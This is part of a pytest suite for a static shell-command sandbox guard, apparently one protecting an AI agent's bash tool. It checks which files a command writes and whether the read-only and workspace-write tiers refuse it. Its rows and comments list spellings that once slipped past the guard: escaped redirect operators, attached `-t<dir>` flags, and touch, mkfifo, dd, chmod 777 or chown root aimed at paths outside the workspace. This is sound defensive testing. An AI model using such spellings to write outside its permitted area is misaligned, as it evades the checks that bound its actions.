    ("echo x 2'>>' log", "log", ("/bin/sh", "/bin/bash")),
    ("echo x 2'>' out.txt", "out.txt", ("/bin/sh", "/bin/bash")),
]


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh and /bin/bash do not exist")
@pytest.mark.parametrize("cmd,named,shells", UNRESOLVED_QUOTED_OPERATOR_OVER_BLOCKS)
def test_an_unresolvable_quoted_operator_is_a_measured_over_block(
    cmd: str, named: str, shells: tuple
):
    """Issue #1273 rows 1-2: a refusal whose command really writes nothing.

    The shell is the oracle on one side — each line is run by the shells the row
    names in its own fresh scratch directory, and the directory is read back — and
    the walk's own answer is the other. Asserting both is what keeps the residual
    honest in both directions: the walk may not be *praised* for this refusal (the
    shell creates nothing), and it may not quietly stop naming the word either,
    because that is the change that would have to come with the fix.
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    for shell in shells:
        d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-overblock-")
        try:
            proc = subprocess.run([shell, "-c", cmd], cwd=d, capture_output=True)
            created = sorted(os.listdir(d))
            assert proc.returncode == 0, f"{shell} could not run {cmd!r} - re-measure"
            assert created == [], f"{shell} created {created!r} for {cmd!r}"
        finally:
            shutil.rmtree(d, ignore_errors=True)
    assert _extract_write_targets(cmd) == [named], cmd
    allowed, reason, _ = _check_sandbox(cmd, "read-only")
    assert allowed is False, f"{cmd!r} is refused today ({reason!r})"


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh and /bin/bash do not exist")
def test_the_over_block_is_scoped_to_the_unresolvable_spelling():
    """The control: where the shell *does* write, the same walk is right on purpose.

    Without this, "the walk refuses these two lines" would be indistinguishable from
    a walk that refuses every redirect it cannot spell out — and the pin above would
    be measuring a guard that had stopped working rather than one with a known price.
    Each control line is run the same way and really creates the file it is refused
    for, so a fix that relaxed the *resolvable* cases would fail here, not there.
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    for cmd, named in (
        ("echo x 2>> log", "log"),      # the same word, unquoted: a real redirect
        ("echo x > log", "log"),        # the operator standing alone
        ("echo x 2> log", "log"),       # the fd-prefixed spelling, unquoted
    ):
        d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-overblock-control-")
        try:
            proc = subprocess.run(["/bin/sh", "-c", cmd], cwd=d, capture_output=True)
            created = sorted(os.listdir(d))
            assert proc.returncode == 0, f"/bin/sh could not run {cmd!r} - re-measure"
            assert created == [named], f"/bin/sh created {created!r} for {cmd!r}"
        finally:
            shutil.rmtree(d, ignore_errors=True)
        assert _extract_write_targets(cmd) == [named], cmd
        assert _check_sandbox(cmd, "read-only")[0] is False, cmd


# Issue #1307 — the same missing fact as #1273, in the direction the corpus's own
# "no unnamed write" assertion exists to catch.
#
# An operator-shaped word that reached its shape through a **backslash** and sits in
# *target* position was read as an operator, so the walk named the following word —
# a file that is not the one written — or, when the escaped `|` dequoted onto a
# command separator, named nothing at all. The second case is the one that may never
# be traded away: an unnamed write is invisible at `read-only`, and four spellings
# were ALLOWED there although the shell created a file (measured on master
# `cc352419`, the sweep the issue was filed with).
#
# The two shapes at all four prefixes, each row run by `/bin/sh` in its own fresh
# scratch directory with the directory listed afterwards: the shell creates exactly
# the escaped character's file, so both halves are assertable — the ground truth and
# the walk's answer — and the third assertion is the one that matters, since a guard
# that names the right file and then permits it would pass the first two.
_ESCAPED_TARGET_ROWS = [
    # (command, the file the shell really redirects into)
    ("echo x >\\> log", ">"),
    ("echo x 2>\\> log", ">"),
    ("echo x 1>\\> log", ">"),
    ("echo x x>\\> log", ">"),
    ("echo x >\\| log", "|"),
    ("echo x 2>\\| log", "|"),
    ("echo x 1>\\| log", "|"),
    ("echo x x>\\| log", "|"),
]


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh does not exist")
@pytest.mark.parametrize("cmd,created", _ESCAPED_TARGET_ROWS)
def test_the_escaped_operator_in_target_position_is_named_and_refused(
    cmd: str, created: str
):
    """Issue #1307: an escaped word in target position is the file, not the operator.

    `\\>` is the file `>`, `\\|` is the file `|` — the shell's own rule, and the one
    the walk had no counterpart for while `is_operator` already excluded the *quoted*
    half of the same fact (#1268/#1280). Each row is measured in both directions
    here: the directory listing says which file the shell opened, the walk must name
    that file and nothing else, and `read-only` must refuse the line. The last
    assertion is why the row exists at all — before the fix these four `>\\|` rows
    produced an empty target list and were ALLOWED.
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-escaped-")
    try:
        proc = subprocess.run(["/bin/sh", "-c", cmd], cwd=d, capture_output=True)
        files = sorted(os.listdir(d))
    finally:
        shutil.rmtree(d, ignore_errors=True)
    assert proc.returncode == 0, f"/bin/sh could not run {cmd!r} - re-measure"
    assert files == [created], f"/bin/sh created {files!r} for {cmd!r} - re-measure"
    assert _extract_write_targets(cmd) == [created], cmd
    allowed, reason, _ = _check_sandbox(cmd, "read-only")
    assert allowed is False, f"{cmd!r} was ALLOWED at read-only ({reason!r})"


# The other half of the same fact, and the half the fix *removes*: where the escaped
# word is an ordinary argument, the shell opens nothing, and the walk used to believe
# the operator shape anyway — five of these rows stop being refused.
_ESCAPED_ARGUMENT_ROWS = [
    "echo x \\> log",           # the operand of no operator at all
    "echo x <\\> log",          # `<\>` is a *read*, and the file behind it need not exist
    "echo x \\>\\> log",        # both characters escaped: one argument
    "echo x \\>\\| log",
    "echo x \\|a log",          # the escape sits inside a word, not before one
]


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh does not exist")
@pytest.mark.parametrize("cmd", _ESCAPED_ARGUMENT_ROWS)
def test_a_line_whose_escaped_word_is_an_argument_names_no_target(cmd: str):
    """Issue #1307 from the over-block side: the shell writes nothing, and now so does the walk.

    Every row is run in a fresh scratch directory and the directory must stay empty
    — that is the classification, not an inference: the refusal these lines used to
    get was a defect, and the fix is allowed to remove it. `echo x <\\> log` is worth
    naming: the shell exits 1 there (`<` needs the file to exist), so the row is
    pinned as "opens no file" rather than "succeeds".
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-escaped-arg-")
    try:
        subprocess.run(["/bin/sh", "-c", cmd], cwd=d, capture_output=True)
        files = sorted(os.listdir(d))
    finally:
        shutil.rmtree(d, ignore_errors=True)
    assert files == [], f"/bin/sh created {files!r} for {cmd!r} - re-measure"
    assert _extract_write_targets(cmd) == [], cmd
    assert _check_sandbox(cmd, "read-only")[0] is True, cmd


# …and the shape where the escaped word follows a real operator. The run-tail helper
# is the walk's *other* reader of operator-shaped tokens in target position (#1280),
# and it read the escaped word as part of the operator run: measured, it named the
# same file twice (`['>', '>']`) where the shell opens it once, and it refused lines
# such as `echo x \> '>'` that open nothing at all. Both halves are pinned here,
# because a duplicate target is the kind of drift a "does it name the file" assertion
# cannot see.
_ESCAPED_RUN_TAIL_ROWS = [
    # (command, the single file the shell redirects into)
    ("echo x > \\>", ">"),
    ("echo x 2> \\>", ">"),
    ("echo x >> \\>", ">"),
    ("echo x >| \\>", ">"),
]


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh does not exist")
@pytest.mark.parametrize("cmd,created", _ESCAPED_RUN_TAIL_ROWS)
def test_an_escaped_word_after_a_real_operator_is_named_once(cmd: str, created: str):
    """Issue #1307 in the run-tail helper: one file, named once, and refused.

    The shell half is the same measurement as the acceptance pin: the escaped word
    *is* the redirect target, so it is created, and the walk must name it exactly
    once — `['>', '>']` is the answer the helper gives when it does not know the word
    was escaped, and a list with the same file twice is a claim about a command that
    does not exist. `test_a_line_whose_escaped_word_is_an_argument_names_no_target`
    covers the same helper from the other side (`echo x \\> '>'`, which writes
    nothing and must therefore name nothing).
    """
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-escaped-tail-")
    try:
        proc = subprocess.run(["/bin/sh", "-c", cmd], cwd=d, capture_output=True)
        files = sorted(os.listdir(d))
    finally:
        shutil.rmtree(d, ignore_errors=True)
    assert proc.returncode == 0, f"/bin/sh could not run {cmd!r} - re-measure"
    assert files == [created], f"/bin/sh created {files!r} for {cmd!r} - re-measure"
    assert _extract_write_targets(cmd) == [created], cmd
    assert _check_sandbox(cmd, "read-only")[0] is False, cmd


# Issue #1273 rows 1-2, measured as a **class** rather than as three examples.
#
# The pin above is three spellings, and three spellings are a sample: the same
# question — "is this operator-shaped word really an operator?" — is asked by every
# line whose operator carries quoting or escaping, and there are many such lines
# (the corpus below runs every prefix against every operator spelling and target,
# and the operator spellings are the *family* rather than a sample — see
# `_masked_operator_spellings`, plus issue #1307's escaped targets).
# A sample cannot show whether the price
# is bounded, which is the thing a reader of the residual needs to know, so the
# generated corpus is what the classification is measured against:
#
#   * the shell is the oracle for *what the line does* — each row is run in a fresh
#     scratch directory and the directory is read back, so "writes nothing" is
#     observed rather than argued;
#   * the walk is asked for its targets and its `read-only` verdict;
#   * the corpus is built from POSIX spellings only (`&>` is bash's, and `/bin/sh`
#     on the CI Linux leg is dash, which reads it as backgrounding — the existing
#     tests handle that spelling per shell, this corpus does not need it);
#   * one shell is enough here because quoting and escaping are POSIX: the rows
#     below behave the same in `/bin/sh` and `/bin/bash`, which the per-row pin
#     above asserts for its own spellings.
#
# Two properties are asserted, in the two directions:
#
#   1. **no unnamed write** — every file the shell really creates is named by the
#      walk. This is the direction that may never be traded away: an unnamed write
#      is invisible at `read-only` and, for a path outside the workspace, at
#      `workspace-write` too. Measured over this corpus: no unnamed write, and the
#      assertion is demonstrably load-bearing — the two arms below make it fire, and
#      it is the assertion issue #1307's escaped target spellings failed before the
#      fix (they were the rows that named nothing and were allowed at `read-only`).
#   2. **the over-block class stays masked** — an over-blocked row must carry an
#      operator-shaped word whose own spelling is quoted or escaped (or a partially
#      quoted word, which is #1280's priced class). Measured today: every one of the
#      corpus's over-block rows is masked, so this half cannot fire on the tree as
#      it stands — it is a **tripwire** for the day the walk starts refusing a line
#      a reader would call plain. The non-vacuity assertions below are what keep the
#      green meaningful: the corpus must contain rows the shell really writes *and*
#      masked over-blocks, so a corpus that quietly stopped exercising either
#      outcome fails here instead of passing.
_CORPUS_PREFIXES = ["echo x", "echo 'a'b", "test 1 'a'b x"]


def _masked_operator_spellings() -> list[str]:
    """Every spelling of `>`/`>>` whose operator **word** carries quoting/escaping.

    Issue #1300: the list below used to be a *chosen sample* of this family, so the
    corpus measured its list rather than the class — four spellings an external
    sweep had measured as members (`2">>"`, `\\2\\>`, `\\2\\>\\>`, `\\>\\>`) were
    simply absent, and the failure that leaves is a later fix teaching the pairing
    about `'` but not `"`: the twin stays refused while every non-vacuity assertion
    in the corpus stays satisfied.

    The family is the three maskings (single-quoted, double-quoted, fully escaped)
    of the operator, each with the word's prefix plain, a bare `2`, or itself
    escaped — 18 spellings. It is generated rather than listed so that the corpus
    runs the family by construction; `test_the_corpus_operator_list_covers_the_
    masked_family` pins the family independently, because a generator that quietly
    stopped emitting a member would shrink the list and the corpus together.

    The boundary is honest: this is the family of `>`/`>>`, the two operator shapes
    the residual's own evidence is about. Other operators (`>|`, `<>`) keep their
    single spellings, and *partial* quoting (`'a'b`) is #1280's separately priced
    class, not this one.
    """
    spellings: list[str] = []
    for op in (">", ">>"):
        for word in (f"'{op}'", f'"{op}"', "".join("\\" + c for c in op)):
            for prefix in ("", "2", "\\2"):
                spellings.append(prefix + word)
    return spellings


_ESCAPED_TARGET_SPELLINGS = [">\\>", ">\\|"]
"""Issue #1307: escaped words in **target** position, run through the corpus too.

The pin below lists the issue's own eight rows; these two spellings put the same
fact into the generated corpus, so the *class* assertion ("no unnamed write" over
every prefix and target, not over the row list) is the one that fails if the escape
fact is ever lost — and it fails on rows the issue never enumerated (three prefixes
x three targets each). `>\\|` is the spelling that was allowed at `read-only`; the
`>\\>` spelling named the following word instead of the file the shell opened.
"""


_CORPUS_OPERATORS = [
    ">", ">>", "2>", "2>>", ">|", "<>",       # plain: the walk must agree
    *_masked_operator_spellings(),            # …and every masked member of the family
    *_ESCAPED_TARGET_SPELLINGS,               # …and the escaped targets of issue #1307
]
_CORPUS_TARGETS = ["log", "out.txt", "'>'"]


def _corpus_rows() -> list[tuple[str, list[str], bool, list[str]]]:
    """(command, walk targets, allowed at read-only, files the shell created).

    Also returns the rows' shape, because the property is about which rows are
    over-blocked and not only how many: the caller separates plain from masked.
    """
    import itertools
    import shutil

    scratch_root = os.path.dirname(os.path.abspath(__file__))
    rows = []
    for prefix, operator, target in itertools.product(
        _CORPUS_PREFIXES, _CORPUS_OPERATORS, _CORPUS_TARGETS
    ):
        cmd = f"{prefix} {operator} {target}"
        d = tempfile.mkdtemp(dir=scratch_root, prefix="emrg-corpus-")
        try:
            proc = subprocess.run(["/bin/sh", "-c", cmd], cwd=d, capture_output=True)
            created = sorted(os.listdir(d))
        finally:
            shutil.rmtree(d, ignore_errors=True)
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        rows.append((cmd, _extract_write_targets(cmd), allowed, created))
    return rows


def _row_is_masked(cmd: str) -> bool:
    """Does the line carry quoting or escaping anywhere it matters?

    A row is *masked* when the token before the target is quoted/escaped or a
    partially quoted word sits on the line — the two facts the walk cannot recover
    from the token stream, and the only ones the corpus allows an over-block for.
    """
    parts = cmd.split()
    operator_word = parts[-2]
    return ("'" in operator_word or '"' in operator_word or "\\" in operator_word
            or any(("'" in p or "\\" in p) for p in parts[:-2]))


def test_the_corpus_operator_list_covers_the_masked_family():
    """Issue #1300: the operator list is the family, and the family is pinned here.

    `_CORPUS_OPERATORS` is generated from `_masked_operator_spellings`, which makes
    "the corpus runs the family" true by construction — and also lets a generator
    that quietly stopped emitting one member shrink the list and the corpus
    *together*, with nothing to notice it. So the family is spelled out here,
    independently of the generator: its measured size, and both twins of every
    operator, which is the trap #1300 was filed for — a later fix that teaches the
    pairing about `'` but not `"` leaves the `"`-twin refused while the corpus's
    non-vacuity assertions stay satisfied.
    """
    family = _masked_operator_spellings()
    assert len(family) == 18, f"the family changed size: {sorted(set(family))}"
    for op in (">", ">>"):
        for word in (f"'{op}'", f'"{op}"', "".join("\\" + c for c in op)):
            for prefix in ("", "2", "\\2"):
                assert prefix + word in family, f"{prefix + word!r} left the family"
    assert set(family) <= set(_CORPUS_OPERATORS), (
        "the corpus does not run every member of the masked family: "
        f"{sorted(set(family) - set(_CORPUS_OPERATORS))}"
    )


@pytest.mark.skipif(sys.platform == "win32",
                    reason="POSIX shell ground truth: /bin/sh does not exist")
def test_the_generated_corpus_has_no_unnamed_write_and_no_plain_over_block():
    """Issue #1273: the price of the fallback, measured over a generated corpus.

    Asserting the class rather than the sample is what makes the residual
    *bounded*: the walk may be wrong about lines whose operator spelling is masked
    (measured: it refuses them although the shell writes nothing), and it may not
    be wrong about anything else. Both directions are asserted, so neither a new
    unnamed write nor a newly over-blocked plain line can land as a green suite.
    """
    rows = _corpus_rows()
    assert len(rows) >= 100, f"the corpus collapsed to {len(rows)} rows - re-measure"

    unnamed = [
        (cmd, created) for cmd, targets, _allowed, created in rows
        if any(f not in targets for f in created)
    ]
    assert not unnamed, (
        "the walk must name every file the shell really creates; these writes are "
        f"unnamed (an invisible write at read-only): {unnamed[:5]}"
    )

    plain_over_blocks = [
        cmd for cmd, targets, allowed, created in rows
        if created == [] and targets and not allowed and not _row_is_masked(cmd)
    ]
    assert not plain_over_blocks, (
        "a plain line (no quoting, no escaping) must not be over-blocked - that is a "
        f"new defect rather than this residual: {plain_over_blocks}"
    )

    # The instrument must be looking at both outcomes, or "no plain over-blocks" is
    # satisfied by a corpus that contains none, and "no unnamed write" by one whose
    # commands write nothing at all.
    writes = [cmd for cmd, _t, _a, created in rows if created]
    masked_over_blocks = [
        cmd for cmd, targets, allowed, created in rows
        if created == [] and targets and not allowed and _row_is_masked(cmd)
    ]
    assert masked_over_blocks, "the residual class vanished - re-measure the corpus"
    assert len(writes) >= 20, (
        f"only {len(writes)} corpus row(s) really write a file, so an unnamed write "
        "could not be observed even if one existed - re-measure the corpus"
    )


# ── issue #1398: the everyday writers name what they write ────────────────
#
# Measured on master `6667fba7`, `emrg/tools/bash_tool.py` sha256[:16]
# `53c6faef76cde822`, in one geometry whose target lay outside every allowed root:
# `touch`, `mkdir`, `ln -s`, `install -m`, `dd of=`, `chmod 777` and `chown root`
# were ALLOWED at **both** tiers with an *empty* target list, while
# `cat > <outside>/f` and `rm -rf <outside>` were refused. The walk's verb list was
# short by the plain everyday spellings, and an empty target list is allowed by
# construction — the loop that judges targets never ran. Driven end to end through
# the tool in the same geometry, `touch` and `mkdir` really created their file and
# their directory, which is why an ALLOW here *is* the write (`_check_sandbox`'s
# own contract: static scan only, no OS-level boundary).

# Outside every allowed root (workspace, OS temp root, the evolution data dir) and
# used only as an argument to the pure predicate — never executed and never opened.
OUTSIDE_TARGET = "/outside/emrg"

# Residuals of the same class, measured *after* the verb list above was written —
# on its own branch, not on master. In the same geometry, `mkfifo <o>/f`,
# `mknod <o>/n p`, `link x <o>/l` and `link <o>/a <o>/b` were still ALLOW at both
# tiers with an empty target list, i.e. one verb list short of covering the class
# the list exists for. `lk`/`link`/`mknod` are not exotic: `link` is `ln` without
# options and `mknod` makes a fifo as readily as a device node.
#
# The `-t` spellings below are the other half of the same family, and their ground
# truth cannot be measured on this host: BSD `cp`/`ln` have no `-t` at all (macOS).
# Measured on GNU instead (`debian:bookworm-slim`, one directory outside every
# allowed root, the delivered name read back off disk): `cp x -t<dir>`,
# `mv x -t<dir>`, `install -m 644 x -t<dir>`, `install -Dt <dir> x`,
# `cp -rt <dir> x` and `ln -s x -t<dir>` all exit 0 with the file in `<dir>` — while
# only the bare `-t <dir>` token was read, so the other five named no target and
# both tiers allowed them. The last two rows are the controls in the other
# direction: `-T` is a flag and `-S` takes a *suffix*, so neither may be read as a
# `-t` — a scan that mistook them would name the source and block the wrong file.
#
# (row, command, every path the walk must name for it)
EVERYDAY_WRITES = (
    ("touch", f"touch {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("touch -d", f"touch -d 2020-01-01 {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("touch -r", f"touch -r /etc/passwd {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("mkdir", f"mkdir {OUTSIDE_TARGET}/d", (f"{OUTSIDE_TARGET}/d",)),
    ("mkdir -m", f"mkdir -m 755 {OUTSIDE_TARGET}/d", (f"{OUTSIDE_TARGET}/d",)),
    ("mkfifo", f"mkfifo {OUTSIDE_TARGET}/f", (f"{OUTSIDE_TARGET}/f",)),
    ("mkfifo -m", f"mkfifo -m 644 {OUTSIDE_TARGET}/f", (f"{OUTSIDE_TARGET}/f",)),
    ("mkfifo two", f"mkfifo {OUTSIDE_TARGET}/f1 {OUTSIDE_TARGET}/f2",
     (f"{OUTSIDE_TARGET}/f1", f"{OUTSIDE_TARGET}/f2")),
    # Only the node is created: naming `p` would block a token that is not a path.
    ("mknod", f"mknod {OUTSIDE_TARGET}/n p", (f"{OUTSIDE_TARGET}/n",)),
    ("mknod -m", f"mknod -m 644 {OUTSIDE_TARGET}/n p", (f"{OUTSIDE_TARGET}/n",)),
    ("mknod device", f"mknod {OUTSIDE_TARGET}/n b 1 3", (f"{OUTSIDE_TARGET}/n",)),
    ("ln -s", f"ln -s x {OUTSIDE_TARGET}/l", (f"{OUTSIDE_TARGET}/l",)),
    ("ln -t", f"ln -t {OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("ln --target-directory=", f"ln --target-directory={OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("ln -t attached", f"ln -s x -t{OUTSIDE_TARGET}", (OUTSIDE_TARGET,)),
    ("link", f"link x {OUTSIDE_TARGET}/l", (f"{OUTSIDE_TARGET}/l",)),
    ("cp", f"cp x {OUTSIDE_TARGET}/dst", (f"{OUTSIDE_TARGET}/dst",)),
    ("cp -s", f"cp -s x {OUTSIDE_TARGET}/l", (f"{OUTSIDE_TARGET}/l",)),
    ("cp -t", f"cp -t {OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("cp -t attached", f"cp x -t{OUTSIDE_TARGET}", (OUTSIDE_TARGET,)),
    ("cp -rt spaced", f"cp -rt {OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("cp -rt attached", f"cp -rt{OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("cp -T is a flag", f"cp -T x {OUTSIDE_TARGET}/dst", (f"{OUTSIDE_TARGET}/dst",)),
    ("cp -St is a suffix", f"cp -St x {OUTSIDE_TARGET}/dst", (f"{OUTSIDE_TARGET}/dst",)),
    ("mv", f"mv x {OUTSIDE_TARGET}/m", (f"{OUTSIDE_TARGET}/m",)),
    ("mv -t", f"mv -t {OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("mv -t attached", f"mv x -t{OUTSIDE_TARGET}", (OUTSIDE_TARGET,)),
    ("install -m", f"install -m 644 x {OUTSIDE_TARGET}/i", (f"{OUTSIDE_TARGET}/i",)),
    ("install -t attached", f"install -m 644 x -t{OUTSIDE_TARGET}", (OUTSIDE_TARGET,)),
    ("install -Dt spaced", f"install -Dt {OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("install -Dt attached", f"install -Dt{OUTSIDE_TARGET} x", (OUTSIDE_TARGET,)),
    ("install -d", f"install -d {OUTSIDE_TARGET}/d1", (f"{OUTSIDE_TARGET}/d1",)),
    ("install -d two", f"install -d {OUTSIDE_TARGET}/d1 {OUTSIDE_TARGET}/d2",
     (f"{OUTSIDE_TARGET}/d1", f"{OUTSIDE_TARGET}/d2")),
    ("dd of= first", f"dd of={OUTSIDE_TARGET}/d if=/dev/zero", (f"{OUTSIDE_TARGET}/d",)),
    ("dd of= last", f"dd if=/dev/zero of={OUTSIDE_TARGET}/d bs=1", (f"{OUTSIDE_TARGET}/d",)),
    ("chmod octal", f"chmod 777 {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("chmod -R", f"chmod -R +x {OUTSIDE_TARGET}/d", (f"{OUTSIDE_TARGET}/d",)),
    ("chown", f"chown root {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("chown -h", f"chown -h root {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("chgrp", f"chgrp staff {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
    ("chmod --reference=", f"chmod --reference=/etc/passwd {OUTSIDE_TARGET}/t",
     (f"{OUTSIDE_TARGET}/t",)),
    ("sh -c", f"sh -c 'touch {OUTSIDE_TARGET}/t'", (f"{OUTSIDE_TARGET}/t",)),
    ("bash -c", f"bash -c 'mkdir {OUTSIDE_TARGET}/d'", (f"{OUTSIDE_TARGET}/d",)),
    ("env prefix", f"env touch {OUTSIDE_TARGET}/t", (f"{OUTSIDE_TARGET}/t",)),
)

_WRITE_ROW_IDS = [row for row, _c, _n in EVERYDAY_WRITES]


@pytest.mark.parametrize("row,cmd,named", EVERYDAY_WRITES, ids=_WRITE_ROW_IDS)
def test_the_walk_names_the_file_an_everyday_writer_writes(row, cmd, named):
    """The target list, so the block can name it and not just say no.

    A verb that names no target is not refused by either tier, which is how this
    class was reachable at all; a verb that names the *wrong* token (a mode, an
    owner, the `dd` *read* side) blocks on a path the command never touches, which
    is the neighbouring defect this family keeps finding.
    """
    assert tuple(_extract_write_targets(cmd)) == named


@pytest.mark.parametrize("row,cmd,named", EVERYDAY_WRITES, ids=_WRITE_ROW_IDS)
def test_both_tiers_refuse_an_everyday_writer_that_leaves_the_workspace(row, cmd, named):
    """Both tiers, and the refusal names the file rather than the verb.

    `read-only`'s promise is stronger than the tag suggests ("blocks every
    destructive write"), and this is the tier a dirty-tree downgrade drops a task
    into — a task that could `touch`, `mkdir`, `dd` or `chmod` anywhere the
    process can reach was not read-only in any useful sense.
    """
    for tier in ("read-only", "workspace-write"):
        allowed, reason, enforcement = _check_sandbox(cmd, tier, workdir="/workspace")
        assert allowed is False, f"{tier} allowed {cmd!r}"
        # The reason quotes the *first* named target, which is what a refusal can
        # report: `install -d <a> <b>` has two destinations and one sentence.
        assert named[0] in reason, f"{tier} block for {cmd!r} does not name {named[0]!r}"
        assert enforcement == "partial", (
            "the everyday writers are now read, but an interpreter still writes "
            "anywhere it likes - the label must stay `partial` (issue #1398)"
        )


# Forms that write *nothing*, or write only inside: their verdict must not move.
# The inside half of this list is the false-block direction of the same change.
NOT_WRITES_OR_INSIDE = (
    "dd if=/outside/emrg/f",                       # dd's read side, no destination
    "dd if=/outside/emrg/f of=/dev/null",          # the one destination both tiers allow
    "chmod",                                       # no operand at all
    "chown root",                                  # owner but no file
    f"touch -d 2020-01-01",                        # a stamp with no file
    f"chmod --reference=/etc/passwd /workspace/t",  # the mode's own file is a read
    f"touch -r /etc/passwd /workspace/f",
    "touch f.txt",                                 # relative to the workspace
    "mkdir -p a/b/c",
    "ln -s x /workspace/l",
    "ln -t /workspace a b",
    "cp -t /workspace a b",
    "install -m 644 x /workspace/i",
    "install -d /workspace/d",
    "dd if=/dev/zero of=/workspace/d",
    "chmod 777 /workspace/t",
    "chown root /workspace/t",
    "chgrp staff /workspace/t",
    "cp -s x /workspace/l",
    "mv /workspace/a /workspace/b",
    "mkfifo /workspace/f",
    "mkfifo /workspace/f1 /workspace/f2",
    "mknod /workspace/n p",
    "mknod /workspace/n b 1 3",
    "link x /workspace/l",
    "cp x -t/workspace",
    "ln -s x -t/workspace",
    "mv x -t/workspace",
    "install -m 644 x -t/workspace",
    "cp -rt /workspace x",
    "install -Dt /workspace x",
    # The two controls: neither `-T` nor `-S` may be read as a `-t`. Getting this
    # wrong names the *source* and refuses the workspace's own destination.
    "cp -T x /workspace/dst",
    "cp -St x /workspace/dst",
)


@pytest.mark.parametrize("cmd", NOT_WRITES_OR_INSIDE, ids=NOT_WRITES_OR_INSIDE)
def test_the_forms_that_write_nothing_or_stay_inside_are_still_allowed(cmd):
    """The false-block half, pinned: a guard that refuses its own workspace is
    worse than the hole it closed (`read-only` is the tier whose documented
    recovery flow is to keep running commands from inside it)."""
    allowed, reason, _ = _check_sandbox(cmd, "workspace-write", workdir="/workspace")
    assert allowed is True, f"{cmd!r} is a false block: {reason}"


def test_read_only_answers_the_new_writers_the_way_it_answers_the_old_ones():
    """Why an inside write is refused by `read-only` and allowed by
    `workspace-write`, measured against the writers that were already there.

    The asymmetry is not new and not the change's to make: `read-only` refuses a
    write *anywhere* but `/dev/null` — `rm -rf build` and `sed -i s/a/b/ f.txt`
    get exactly that answer on master — while `workspace-write` allows one inside
    the workspace. Pinning the two families together is what makes this a
    *measured parity* rather than a claim that the new verbs are special.
    """
    for cmd in ("rm -rf build", "sed -i s/a/b/ f.txt", "truncate -s 0 out.txt",
                "touch f.txt", "mkdir -p a/b", "ln -s x l", "chmod 777 f.txt",
                "chown root f.txt", "dd if=/dev/zero of=f.bin"):
        assert _check_sandbox(cmd, "read-only", workdir="/workspace")[0] is False, cmd
        assert _check_sandbox(cmd, "workspace-write", workdir="/workspace")[0] is True, cmd


# ── the naming arms: the destination, never a mode, an owner or a source ──

def test_a_metadata_block_names_the_file_and_not_the_mode_or_the_owner():
    """Issue #1398 acceptance 1, as assertions rather than as prose.

    `chown root <outside>/t` named *both* operands while this was being fixed, so
    the refusal said "targeting 'root'" — a guard whose message points at a token
    that is not a path is the defect `_positional_args`'s docstring already names.
    `--reference` is the one spelling that turns the first operand back into a
    file, and it is asserted in both of the ways a caller can write it, because a
    flag asked about by name is a claim about *both* spellings.
    """
    t = f"{OUTSIDE_TARGET}/t"
    assert _extract_write_targets(f"chown root {t}") == [t]
    assert _extract_write_targets(f"chown root:staff {t}") == [t]
    assert _extract_write_targets(f"chown 1000:1000 {t}") == [t]
    assert _extract_write_targets(f"chgrp staff {t}") == [t]
    assert _extract_write_targets(f"chmod 777 {t}") == [t]
    assert _extract_write_targets(f"chmod u+x {t}") == [t]
    assert _extract_write_targets(f"chmod --reference=/etc/passwd {t}") == [t]
    assert _extract_write_targets(f"chmod --reference /etc/passwd {t}") == [t]

    # `-t <dir>` moves the destination off the operand it displaces, so the
    # operands left behind are sources and must not be named (`ln -t <outside> a b`
    # named `b` while the branch read the last operand and the flag together).
    assert _extract_write_targets(f"ln -t {OUTSIDE_TARGET} a b") == [OUTSIDE_TARGET]
    assert _extract_write_targets(f"cp -t {OUTSIDE_TARGET} a b") == [OUTSIDE_TARGET]
    assert _extract_write_targets(f"mv -t {OUTSIDE_TARGET} a b") == [OUTSIDE_TARGET]
    assert _extract_write_targets(f"install -t {OUTSIDE_TARGET} a b") == [OUTSIDE_TARGET]
    assert _extract_write_targets(f"install --target-directory={OUTSIDE_TARGET} a") == [
        OUTSIDE_TARGET
    ]

    # `dd`'s `if=` is the read side; the walk may name it only as the file it is
    # not writing to.
    assert _extract_write_targets(f"dd if={OUTSIDE_TARGET}/f of={OUTSIDE_TARGET}/d") == [
        f"{OUTSIDE_TARGET}/d"
    ]
    assert _extract_write_targets(f"dd if={OUTSIDE_TARGET}/f") == []

    # `-s` is a *size* to `truncate`/`shred` and takes no value for `ln`/`cp`, and
    # reading one table for both made `cp -s x <target>` — which really creates the
    # link at `<target>` — name nothing at all (measured on master: ALLOW at both
    # tiers).
    assert _extract_write_targets(f"cp -s x {OUTSIDE_TARGET}/l") == [f"{OUTSIDE_TARGET}/l"]
